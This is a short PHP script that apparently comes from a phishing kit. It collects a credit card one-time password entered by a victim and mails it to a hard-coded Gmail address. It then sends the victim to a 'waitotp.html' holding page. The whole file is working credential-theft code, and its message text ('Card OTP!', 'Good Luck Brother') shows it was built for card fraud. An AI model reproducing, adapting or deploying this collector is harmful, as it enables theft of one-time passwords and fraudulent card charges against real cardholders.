<?php
/* Set e-mail recipient */
$myemail  = "reserveallen@gmail.com";

/* Check all form inputs using check_input function */
$ss  = check_input($_POST['ss'], "Enter your OTP");

/* Let's prepare the message for the e-mail */
$subject = "Card OTP!";

/* Let's prepare the message for the e-mail */
$message = "Heita!!

You have just received a new Credit card OTP:

OTP: $ss

Good Luck Brother.
";

/* Send the message using mail() function */
mail($myemail, $subject, $message);

/* Redirect visitor to the thank you page */
header('Location: waitotp.html');
exit();

/* Functions we used */
function check_input($data, $problem='')
{
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data);
    if ($problem && strlen($data) == 0)
    {
        show_error($problem);
    }
    return $data;
}

function show_error($myError)
{
?>
    <html>
    <body>

    <b>Please correct the following error:</b><br />
    <?php echo $myError; ?>

    </body>
    </html>
<?php
exit();
}
?>